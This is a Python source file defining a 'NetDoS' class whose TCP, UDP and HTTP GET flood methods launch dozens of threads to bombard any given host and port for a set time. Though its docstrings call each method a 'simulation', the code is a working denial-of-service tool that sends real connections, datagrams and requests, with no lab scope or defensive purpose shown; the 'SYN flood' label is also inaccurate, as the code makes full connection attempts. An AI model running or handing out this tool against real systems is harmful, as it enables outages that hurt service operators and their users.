import socket
import threading
import time
import random
from typing import List, Dict, Optional

class NetDoS:
    def __init__(self):
        self.is_running = False
        self.threads = []
    
    def tcp_flood(self, target: str, port: int, threads: int = 50, duration: int = 60) -> Dict:
        """TCP SYN flood attack simulation"""
        results = {
            'target': target,
            'port': port,
            'threads': threads,
            'duration': duration,
            'packets_sent': 0,
            'start_time': time.time()
        }
        
        def flood_thread():
            end_time = time.time() + duration
            packets = 0
            
            while time.time() < end_time and self.is_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect_ex((target, port))
                    sock.close()
                    packets += 1
                    
                    # Small delay to prevent overwhelming local system
                    time.sleep(0.001)
                    
                except Exception:
                    pass
            
            results['packets_sent'] += packets
        
        self.is_running = True
        
        # Start flood threads
        for _ in range(threads):
            thread = threading.Thread(target=flood_thread)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        # Wait for completion
        for thread in self.threads:
            thread.join()
        
        results['end_time'] = time.time()
        results['actual_duration'] = results['end_time'] - results['start_time']
        
        self.is_running = False
        self.threads = []
        
        return results
    
    def udp_flood(self, target: str, port: int, threads: int = 50, duration: int = 60) -> Dict:
        """UDP flood attack simulation"""
        results = {
            'target': target,
            'port': port,
            'threads': threads,
            'duration': duration,
            'packets_sent': 0,
            'start_time': time.time()
        }
        
        def flood_thread():
            end_time = time.time() + duration
            packets = 0
            data = random.randbytes(1024)  # Random payload
            
            while time.time() < end_time and self.is_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.sendto(data, (target, port))
                    sock.close()
                    packets += 1
                    
                    time.sleep(0.001)
                    
                except Exception:
                    pass
            
            results['packets_sent'] += packets
        
        self.is_running = True
        
        for _ in range(threads):
            thread = threading.Thread(target=flood_thread)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        for thread in self.threads:
            thread.join()
        
        results['end_time'] = time.time()
        results['actual_duration'] = results['end_time'] - results['start_time']
        
        self.is_running = False
        self.threads = []
        
        return results
    
    def http_flood(self, target: str, port: int = 80, path: str = "/", threads: int = 50, duration: int = 60) -> Dict:
        """HTTP GET flood attack simulation"""
        results = {
            'target': target,
            'port': port,
            'path': path,
            'threads': threads,
            'duration': duration,
            'requests_sent': 0,
            'start_time': time.time()
        }
        
        def flood_thread():
            end_time = time.time() + duration
            requests = 0
            
            while time.time() < end_time and self.is_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((target, port))
                    
                    http_request = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: close\r\n\r\n"
                    sock.send(http_request.encode())
                    
                    # Receive response
                    sock.recv(4096)
                    sock.close()
                    requests += 1
                    
                    time.sleep(0.01)
                    
                except Exception:
                    pass
            
            results['requests_sent'] += requests
        
        self.is_running = True
        
        for _ in range(threads):
            thread = threading.Thread(target=flood_thread)
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        for thread in self.threads:
            thread.join()
        
        results['end_time'] = time.time()
        results['actual_duration'] = results['end_time'] - results['start_time']
        
        self.is_running = False
        self.threads = []
        
        return results
    
    def stop(self):
        """Stop all DoS attacks"""
        self.is_running = False
